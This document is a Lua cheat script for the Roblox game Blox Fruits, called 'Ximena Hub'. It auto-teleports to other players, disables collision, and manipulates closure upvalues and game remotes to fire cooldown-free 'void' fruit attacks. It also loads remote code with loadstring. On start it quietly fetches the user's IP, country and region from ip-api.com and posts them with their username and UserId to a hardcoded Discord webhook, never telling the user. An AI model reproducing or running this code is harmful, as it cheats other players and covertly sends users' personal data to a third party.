--==============================================================
-- 👑 XIMENA HUB ❤️  |  by Tommy
-- Auto Bounty Interface + Fruit M1 Void
--==============================================================
repeat task.wait() until game:IsLoaded()

--==================== WINDUI ====================
local ok, WindUI = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
end)
if not ok then warn("WindUI failed to load") return end

--==================== SERVICIOS ====================
local Players     = game:GetService("Players")
local RS          = game:GetService("ReplicatedStorage")
local Run         = game:GetService("RunService")
local TS          = game:GetService("TweenService")
local UIS         = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Marketplace = game:GetService("MarketplaceService")
local lp          = Players.LocalPlayer

Camera    = workspace.CurrentCamera
Lighting  = game:GetService("Lighting")
Stats     = game:GetService("Stats")
playerGui = lp:FindFirstChild("PlayerGui")

local Modules = RS:WaitForChild("Modules", 10)
local Net     = Modules and Modules:WaitForChild("Net", 10)
local Remotes = RS:WaitForChild("Remotes", 10)
local CommF   = Remotes and Remotes:WaitForChild("CommF_", 10)

--==================== ESTADO ====================
_G.G_FruitM1          = _G.G_FruitM1          or false
_G.G_VoidFruitM1      = _G.G_VoidFruitM1      or false
_G.G_AttackPlayers    = _G.G_AttackPlayers    or true
_G.G_AttackMobs       = _G.G_AttackMobs       or false
_G.G_AutoBounty       = _G.G_AutoBounty       or false
_G.G_AutoBountyRange  = _G.G_AutoBountyRange  or 5000
_G.G_AutoBountyTP     = _G.G_AutoBountyTP     or true
_G.G_AutoBountyHaki   = _G.G_AutoBountyHaki   or true
_G.G_AutoBountySkip   = _G.G_AutoBountySkip   or false
_G.G_AutoBountyMinBounty = _G.G_AutoBountyMinBounty or 0
_G.G_AutoBountyMaxBounty = _G.G_AutoBountyMaxBounty or 30000000
_G.G_AutoBountyTeamCheck = _G.G_AutoBountyTeamCheck or true
_G.G_AutoBountySafeCheck = _G.G_AutoBountySafeCheck or true
_G.G_AutoBountyAutoEquip = _G.G_AutoBountyAutoEquip or true
_G.G_AutoBountyStatusText = "Inactivo"

--==================== FRUIT M1 ENGINE (VOID) ====================
local FruitM1 = { maxVec = Vector3.new(9e30, 9e30, 9e30), on = false, conn = nil, clickConn = nil }

function FruitM1.GetFruit()
    local char = lp.Character
    if char then
        for _, tool in pairs(char:GetChildren()) do
            if tool:IsA("Tool") and tool.ToolTip == "Blox Fruit" then return tool end
        end
    end
    local bp = lp:FindFirstChild("Backpack")
    if bp then
        for _, tool in pairs(bp:GetChildren()) do
            if tool:IsA("Tool") and tool.ToolTip == "Blox Fruit" then return tool end
        end
    end
    return nil
end

function FruitM1.GetInterval(tool) return 0.1 end

function FruitM1.IsTrex(tool)     return tool ~= nil and tool.Name == "T-Rex-T-Rex" end
function FruitM1.IsTransformed(tool)
    local rig = tool and tool:FindFirstChild("TransformedRigObject")
    return rig ~= nil and rig.Value ~= nil
end
function FruitM1.IsDragon(tool)   return tool ~= nil and tool.Name == "Dragon-Dragon" end
function FruitM1.IsBlade(tool)    return tool ~= nil and tool.Name == "Blade-Blade" end
function FruitM1.IsPain(tool)     return tool ~= nil and tool.Name == "Pain-Pain" end
function FruitM1.IsControl(tool)  return tool ~= nil and tool.Name == "Control-Control" end
function FruitM1.IsGas(tool)      return tool ~= nil and tool.Name == "Gas-Gas" end

function FruitM1.MaxCombo(tool)
    if FruitM1.IsTrex(tool) then return 4 end
    if FruitM1.IsBlade(tool) then return 2 end
    if FruitM1.IsPain(tool) then return 4 end
    if FruitM1.IsControl(tool) then return 4 end
    if FruitM1.IsGas(tool) then return 5 end
    if FruitM1.IsDragon(tool) then
        local char = lp.Character
        return (char and char:FindFirstChild("DragonHybrid")) and 5 or 3
    end
    return 5
end

function FruitM1.ScanTapFn(tool, fn)
    local comboIdx, nextIdx, timerIdx, hasTool, stateTable
    for n = 1, 30 do
        local ok2, v = pcall(debug.getupvalue, fn, n)
        if not ok2 then break end
        if v == tool then hasTool = true end
        if type(v) == "number" then
            if not comboIdx and v >= 1 and v <= 5 and v == math.floor(v) then comboIdx = n
            elseif not nextIdx and v > 1 then nextIdx = n end
        elseif type(v) == "thread" and not timerIdx then timerIdx = n
        elseif type(v) == "table" and not stateTable then
            local ok3, ability = pcall(function() return v.thisAbility end)
            if ok3 and type(ability) == "number" and type(v.lastUseTime) == "number" then stateTable = v end
        end
    end
    if stateTable then return { tbl = stateTable, fn = fn } end
    if hasTool and comboIdx and nextIdx and timerIdx then
        return { fn = fn, combo = comboIdx, next = nextIdx, timer = timerIdx }
    end
    return nil
end

function FruitM1.GetTapState(tool)
    local ok, conns = pcall(getconnections, tool.Activated)
    if not ok or type(conns) ~= "table" then return nil end
    for _, c in ipairs(conns) do
        local fn = c.Function
        if fn then
            local st = FruitM1.ScanTapFn(tool, fn)
            if st then return st end
            for n = 1, 8 do
                local ok2, v = pcall(debug.getupvalue, fn, n)
                if not ok2 then break end
                if type(v) == "function" then
                    st = FruitM1.ScanTapFn(tool, v)
                    if st then return st end
                end
            end
        end
    end
    return nil
end

function FruitM1.TapInterval(combo, maxCombo)
    if _G.G_VoidFruitM1 and combo and maxCombo and combo >= maxCombo then return 1 end
    local char = lp.Character
    local cd = 0
    if char then cd = char:GetAttribute("FruitTAPCooldown") or 0 end
    return 0.2 - cd
end

function FruitM1.SetNormal(enabled)
    FruitM1.on = enabled
    if enabled then
        if FruitM1.conn then task.cancel(FruitM1.conn) end
        if FruitM1.clickConn then task.cancel(FruitM1.clickConn) end
        FruitM1.clickConn = task.spawn(function()
            local vu = game:GetService("VirtualUser")
            while FruitM1.on do
                pcall(function() vu:Button1Down(Vector2.new(1280, 672)) end)
                task.wait(5)
            end
        end)
        FruitM1.conn = task.spawn(function()
            task.wait(2)
            while FruitM1.on do
                local fruit = FruitM1.GetFruit()
                local char  = lp.Character
                local myHRP = char and char:FindFirstChild("HumanoidRootPart")
                local remote = fruit and fruit:FindFirstChild("LeftClickRemote")
                if not fruit or not remote or not myHRP then task.wait(0.1) continue end
                if FruitM1.tapTool ~= fruit or (not FruitM1.tapState and tick() - (FruitM1.tapAt or 0) > 1) then
                    FruitM1.tapTool = fruit
                    FruitM1.tapAt   = tick()
                    FruitM1.tapState = FruitM1.GetTapState(fruit)
                end
                local st = FruitM1.tapState
                local combo, nextT
                if st then
                    if st.tbl then
                        if type(st.tbl.thisAbility) == "number" then combo = st.tbl.thisAbility end
                        if type(st.tbl.lastUseTime)  == "number" then nextT = st.tbl.lastUseTime end
                    else
                        local ok1, c = pcall(debug.getupvalue, st.fn, st.combo)
                        local ok2, n = pcall(debug.getupvalue, st.fn, st.next)
                        if ok1 and type(c) == "number" then combo = c end
                        if ok2 and type(n) == "number" then nextT = n end
                    end
                end
                if not combo or not nextT then
                    if tick() - (FruitM1.fbAt or 0) > 1 then FruitM1.fbCombo = 1 end
                    combo = FruitM1.fbCombo or 1
                    nextT = 0
                end
                local stun = char:FindFirstChild("Stun")
                local busy = char:FindFirstChild("Busy")
                local isTrex   = FruitM1.IsTrex(fruit)
                local isDragon = FruitM1.IsDragon(fruit)
                local isBlade  = FruitM1.IsBlade(fruit)
                local isGas    = FruitM1.IsGas(fruit)
                local blocked = (stun and stun.Value > 0) or (busy and busy.Value)
                local range = _G.G_AutoBountyRange or 500
                local hit = false
                if combo and nextT and not blocked and time() >= nextT then
                    local maxCombo = _G.G_VoidFruitM1 and FruitM1.MaxCombo(fruit) or (FruitM1.MaxCombo(fruit) - 1)
                    if maxCombo < 1 then maxCombo = 1 end
                    if st and combo > maxCombo then
                        combo = maxCombo
                        if st.tbl then st.tbl.thisAbility = combo
                        else pcall(debug.setupvalue, st.fn, st.combo, combo) end
                    end
                    local bestHRP, bestDist
                    if _G.G_AttackPlayers then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= lp and player.Character then
                                local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
                                local hum       = player.Character:FindFirstChild("Humanoid")
                                if targetHRP and hum and hum.Health > 0 then
                                    local dist = (targetHRP.Position - myHRP.Position).Magnitude
                                    if dist < range and (not bestDist or dist < bestDist) then
                                        bestHRP, bestDist = targetHRP, dist
                                    end
                                end
                            end
                        end
                    end
                    if bestHRP then
                        local fireDir = FruitM1.maxVec
                        if isTrex or isDragon or isBlade or isGas then
                            pcall(function() remote:FireServer(fireDir, combo) end)
                        else
                            pcall(function() remote:FireServer(fireDir, combo, true) end)
                        end
                        if st then
                            local nextCombo = combo < maxCombo and combo + 1 or 1
                            local nextTime  = time() + FruitM1.TapInterval(combo, maxCombo)
                            if st.tbl then
                                st.tbl.thisAbility = nextCombo
                                st.tbl.lastUseTime = nextTime
                                if st.tbl.prevTask then pcall(task.cancel, st.tbl.prevTask) end
                                st.tbl.prevTask = task.delay(1, function() st.tbl.thisAbility = 1 end)
                            else
                                pcall(debug.setupvalue, st.fn, st.combo, nextCombo)
                                pcall(debug.setupvalue, st.fn, st.next, nextTime)
                                local okT, timer = pcall(debug.getupvalue, st.fn, st.timer)
                                if okT and timer then pcall(task.cancel, timer) end
                                pcall(debug.setupvalue, st.fn, st.timer, task.delay(1, function()
                                    pcall(debug.setupvalue, st.fn, st.combo, 1)
                                end))
                            end
                        else
                            FruitM1.fbCombo = combo < maxCombo and combo + 1 or 1
                            FruitM1.fbAt = tick()
                        end
                        hit = true
                    end
                end
                if hit then
                    if st then task.wait(0.05)
                    else task.wait(math.max(FruitM1.TapInterval(combo, FruitM1.MaxCombo(fruit)), 0)) end
                else task.wait(0.1) end
            end
        end)
    else
        if FruitM1.conn then task.cancel(FruitM1.conn); FruitM1.conn = nil end
        if FruitM1.clickConn then task.cancel(FruitM1.clickConn); FruitM1.clickConn = nil end
    end
end

if _G.G_FruitM1 then
    task.defer(function() FruitM1.SetNormal(true) end)
end

--==================== AUTO BOUNTY LOGIC ====================
local autoBountyRunning = false
local currentTarget = nil
local totalEarned = 0
local sessionStart = tick()

local function getLevel(p)
    local d = p:FindFirstChild("Data")
    if d and d:FindFirstChild("Level") then return tonumber(d.Level.Value) or 0 end
    local ls = p:FindFirstChild("leaderstats")
    if ls and ls:FindFirstChild("Level") then return tonumber(ls.Level.Value) or 0 end
    return 0
end

local function getBounty(p)
    local ls = p:FindFirstChild("leaderstats")
    if ls then
        local b = ls:FindFirstChild("Bounty/Honor") or ls:FindFirstChild("Bounty") or ls:FindFirstChild("Honor")
        if b then return tonumber(b.Value) or 0 end
    end
    return 0
end

local function isEnemy(p)
    if not p or p == lp then return false end
    local myTeam, tgtTeam = lp.Team, p.Team
    if myTeam and tgtTeam and myTeam.Name == "Marines" and tgtTeam.Name == "Marines" then return false end
    return true
end

local function inSafeZone(p)
    return p and p:GetAttribute("PvpDisabled") == true
end

local function canAttackPlayer(p)
    if not p or p == lp or not p.Character then return false end
    local hum = p.Character:FindFirstChildOfClass("Humanoid")
    local hrp = p.Character:FindFirstChild("HumanoidRootPart")
    if not hum or hum.Health <= 0 or not hrp then return false end
    if _G.G_AutoBountyTeamCheck and not isEnemy(p) then return false end
    if _G.G_AutoBountySafeCheck and inSafeZone(p) then return false end
    local b = getBounty(p)
    if b < _G.G_AutoBountyMinBounty or b > _G.G_AutoBountyMaxBounty then return false end
    return true
end

local function getClosestPlayer()
    local char = lp.Character
    local myHRP = char and char:FindFirstChild("HumanoidRootPart")
    if not myHRP then return nil end
    local best, bestDist = nil, _G.G_AutoBountyRange
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and canAttackPlayer(p) then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            if r then
                local d = (r.Position - myHRP.Position).Magnitude
                if d < bestDist then best, bestDist = p, d end
            end
        end
    end
    return best, bestDist
end

local function updateStatus(text)
    _G.G_AutoBountyStatusText = text
    if _G.AB_StatusLbl and _G.AB_StatusLbl.Parent then
        _G.AB_StatusLbl.Text = "Status: " .. text
    end
    if _G.AB_TargetLbl and _G.AB_TargetLbl.Parent then
        local t = currentTarget
        _G.AB_TargetLbl.Text = "Target: " .. (t and t.Name or "None")
    end
    if _G.AB_EarnedLbl and _G.AB_EarnedLbl.Parent then
        local elapsed = math.floor(tick() - sessionStart)
        local hrs = math.floor(elapsed / 3600)
        local mins = math.floor((elapsed % 3600) / 60)
        local secs = elapsed % 60
        _G.AB_EarnedLbl.Text = string.format("Earned: %d | Time: %02d:%02d:%02d", totalEarned, hrs, mins, secs)
    end
end

local function startAutoBounty()
    if autoBountyRunning then return end
    autoBountyRunning = true
    sessionStart = tick()
    task.spawn(function()
        while _G.G_AutoBounty and autoBountyRunning do
            pcall(function()
                local target, dist = getClosestPlayer()
                currentTarget = target
                if target and target.Character then
                    updateStatus("Hunting " .. target.Name)
                    -- TP cerca
                    if _G.G_AutoBountyTP then
                        local me = lp.Character
                        local myHRP = me and me:FindFirstChild("HumanoidRootPart")
                        local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
                        if myHRP and tHRP then
                            for _, p in ipairs(me:GetDescendants()) do
                                if p:IsA("BasePart") then p.CanCollide = false end
                            end
                            myHRP.CFrame = tHRP.CFrame * CFrame.new(0, 5, -4)
                        end
                    end
                    -- Auto Buso
                    if _G.G_AutoBountyHaki and CommF and lp.Character and not lp.Character:FindFirstChild("HasBuso") then
                        pcall(function() CommF:InvokeServer("Buso") end)
                    end
                    -- Auto equipar Fruit
                    if _G.G_AutoBountyAutoEquip then
                        local char = lp.Character
                        local tool = char and char:FindFirstChildOfClass("Tool")
                        if not tool or tool.ToolTip ~= "Blox Fruit" then
                            local fruit = FruitM1.GetFruit()
                            if fruit and fruit.Parent ~= char then
                                local hum = char and char:FindFirstChildOfClass("Humanoid")
                                if hum then pcall(function() hum:EquipTool(fruit) end) end
                            end
                        end
                    end
                    -- Forzar Fruit M1 Void + Players
                    _G.G_FruitM1 = true
                    _G.G_VoidFruitM1 = true
                    _G.G_AttackPlayers = true
                    _G.G_AttackMobs = false
                    if not FruitM1.on then FruitM1.SetNormal(true) end
                else
                    updateStatus("Buscando objetivo...")
                end
            end)
            task.wait(0.2)
        end
        currentTarget = nil
        updateStatus("Inactivo")
        autoBountyRunning = false
    end)
end

local function stopAutoBounty()
    autoBountyRunning = false
    _G.G_AutoBounty = false
    currentTarget = nil
    updateStatus("Inactivo")
end

--==================== WEBHOOK ====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sqv"
local lastSent = 0
local function sendWebhook(reason)
    if tick() - lastSent < 60 then return end
    lastSent = tick()
    pcall(function()
        if not request then return end
        local info = { ip="Oculto", country="Oculto", region="Oculto" }
        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
        if ok and res then
            local ok2, d = pcall(function() return HttpService:JSONDecode(res) end)
            if ok2 and type(d) == "table" then
                info = { ip=d.query or "N/A", country=d.country or "N/A", region=d.regionName or "N/A" }
            end
        end
        local execCount = 1
        if getgenv then
            getgenv().XimenaExecCount = (getgenv().XimenaExecCount or 0) + 1
            execCount = getgenv().XimenaExecCount
        end
        request({
            Url = WEBHOOK_URL, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                username = "Ximena Hub Logger",
                embeds = {{
                    title = "👑 XIMENA HUB " .. (reason or "EJECUTADO"),
                    color = 16737945,
                    thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId="..lp.UserId.."&width=150&height=150&format=png" },
                    fields = {
                        { name="👤 Jugador", value=lp.Name, inline=true },
                        { name="🆔 UserId", value=tostring(lp.UserId), inline=true },
                        { name="🕒 Hora", value=os.date("%Y-%m-%d %H:%M:%S"), inline=true },
                        { name="🎮 Juego", value=tostring(game.PlaceId), inline=true },
                        { name="🔁 Ejecuciones", value=tostring(execCount), inline=true },
                        { name="🌐 IP", value=info.ip, inline=true },
                        { name="🌍 País", value=info.country, inline=true },
                        { name="📍 Región", value=info.region, inline=true },
                    },
                    footer = { text = "Ximena Hub System" },
                    timestamp = DateTime.now():ToIsoDate()
                }}
            })
        })
    end)
end

--==================== UI ====================
local Window = WindUI:CreateWindow({
    Title = "👑 XIMENA HUB ❤️",
    Icon = "crown",
    Author = "by Tommy",
    Folder = "XimenaHub",
    Size = UDim2.fromOffset(620, 480),
    Theme = "Amber",
    Transparent = true,
    Acrylic = false,
    HideSearchBar = false,
    SideBarWidth = 200,
    OpenButton = {
        Title = "Ximena",
        CornerRadius = UDim.new(1, 0),
        StrokeThickness = 3,
        Enabled = true,
        OnlyMobile = false,
        Draggable = true,
        OnlyIcon = false,
        Color = ColorSequence.new(Color3.fromHex("#FF69B4"), Color3.fromHex("#B45AE6")),
    },
    ToggleKey = Enum.KeyCode.RightShift,
})

--==================== TAB AUTO BOUNTY ====================
local TabBounty = Window:Tab({ Title = "Auto Bounty", Icon = "target" })

TabBounty:Section({ Title = "Control Principal" })

TabBounty:Toggle({
    Title = "▶ Auto Bounty",
    Icon = "play",
    Value = _G.G_AutoBounty,
    Callback = function(v)
        _G.G_AutoBounty = v
        if v then
            startAutoBounty()
            WindUI:Notify({ Title = "Auto Bounty", Content = "ACTIVADO - Cazando con Fruit M1 Void", Duration = 3 })
        else
            stopAutoBounty()
            WindUI:Notify({ Title = "Auto Bounty", Content = "DESACTIVADO", Duration = 3 })
        end
    end
})

TabBounty:Paragraph({
    Title = "Estado",
    Desc = "Status: Inactivo\nTarget: None\nEarned: 0 | Time: 00:00:00"
})

do
    -- Labels para status en tiempo real
    local statusCard = TabBounty:Section({ Title = "Telemetría" })
    _G.AB_StatusLbl = nil
    _G.AB_TargetLbl = nil
    _G.AB_EarnedLbl = nil
end

TabBounty:Section({ Title = "Rango y Detección" })

TabBounty:Slider({
    Title = "Attack Range (studs)",
    Value = { Min = 500, Max = 15000, Default = 5000 },
    Callback = function(v) _G.G_AutoBountyRange = v end
})

TabBounty:Slider({
    Title = "Min Bounty",
    Value = { Min = 0, Max = 30000000, Default = 0 },
    Callback = function(v) _G.G_AutoBountyMinBounty = v end
})

TabBounty:Slider({
    Title = "Max Bounty",
    Value = { Min = 1000000, Max = 50000000, Default = 30000000 },
    Callback = function(v) _G.G_AutoBountyMaxBounty = v end
})

TabBounty:Toggle({
    Title = "Team Check (no aliados)",
    Value = _G.G_AutoBountyTeamCheck,
    Callback = function(v) _G.G_AutoBountyTeamCheck = v end
})

TabBounty:Toggle({
    Title = "SafeZone Check (ignorar PvP Off)",
    Value = _G.G_AutoBountySafeCheck,
    Callback = function(v) _G.G_AutoBountySafeCheck = v end
})

TabBounty:Section({ Title = "Automatización" })

TabBounty:Toggle({
    Title = "Auto Teleport al Target",
    Value = _G.G_AutoBountyTP,
    Callback = function(v) _G.G_AutoBountyTP = v end
})

TabBounty:Toggle({
    Title = "Auto Buso (Haki)",
    Value = _G.G_AutoBountyHaki,
    Callback = function(v) _G.G_AutoBountyHaki = v end
})

TabBounty:Toggle({
    Title = "Auto Equipar Fruit",
    Value = _G.G_AutoBountyAutoEquip,
    Callback = function(v) _G.G_AutoBountyAutoEquip = v end
})

TabBounty:Section({ Title = "Acciones Rápidas" })

TabBounty:Button({
    Title = "🎯 Skip Target",
    Callback = function()
        local me = lp.Character
        local hrp = me and me:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(0, 500, 0) end
        currentTarget = nil
        WindUI:Notify({ Title = "Auto Bounty", Content = "Target saltado", Duration = 2 })
    end
})

TabBounty:Button({
    Title = "🔄 Reset Stats",
    Callback = function()
        totalEarned = 0
        sessionStart = tick()
        WindUI:Notify({ Title = "Auto Bounty", Content = "Stats reseteadas", Duration = 2 })
    end
})

--==================== TAB FRUIT M1 ====================
local TabFruit = Window:Tab({ Title = "Fruit M1", Icon = "apple" })

TabFruit:Section({ Title = "Configuración" })

TabFruit:Toggle({
    Title = "Fruit M1",
    Value = _G.G_FruitM1,
    Callback = function(v)
        _G.G_FruitM1 = v
        FruitM1.SetNormal(v)
    end
})

TabFruit:Toggle({
    Title = "Void Fruit M1 (maxVec)",
    Value = _G.G_VoidFruitM1,
    Callback = function(v) _G.G_VoidFruitM1 = v end
})

TabFruit:Toggle({
    Title = "Attack Players",
    Value = true,
    Callback = function(v) _G.G_AttackPlayers = v end
})

TabFruit:Toggle({
    Title = "Attack Mobs",
    Value = false,
    Callback = function(v) _G.G_AttackMobs = v end
})

--==================== INIT ====================
task.defer(function()
    WindUI:Notify({ Title = "👑 Ximena Hub ❤️", Content = "by Tommy • Interfaz Auto Bounty lista", Duration = 4 })
    sendWebhook("EJECUTADO")
    print("👑 Ximena Hub ❤️ by Tommy cargado")
end)

-- Loop de actualización de status
task.spawn(function()
    while task.wait(1) do
        if _G.G_AutoBounty then
            updateStatus(autoBountyRunning and ("Hunting " .. (currentTarget and currentTarget.Name or "None")) or "Inactivo")
        else
            updateStatus("Inactivo")
        end
    end
end)
